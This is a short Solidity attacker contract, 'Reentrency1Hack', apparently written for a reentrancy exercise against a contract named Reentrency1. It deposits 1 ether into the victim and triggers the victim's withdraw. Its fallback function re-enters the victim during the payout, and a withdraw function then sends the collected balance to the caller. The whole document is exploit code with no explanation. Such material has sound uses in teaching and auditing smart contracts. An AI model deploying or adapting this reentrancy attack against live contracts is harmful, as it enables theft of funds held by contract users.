contract Reentrency1Hack {
address public victim;

event fallbackExecuted(uint amount);

function deposit(address _victim) public payable {
    victim = _victim;
    Reentrency1(_victim).deposit{value: 1 ether}();
}

function hack(address _victim) public payable {
    victim = _victim;
    Reentrency1(_victim).withdraw(1 ether);
}

function withdraw() public {
    payable(msg.sender).transfer(address(this).balance);
}

fallback() external payable {
    Reentrency1(victim).deposit();
    
    emit fallbackExecuted(msg.value);
}
}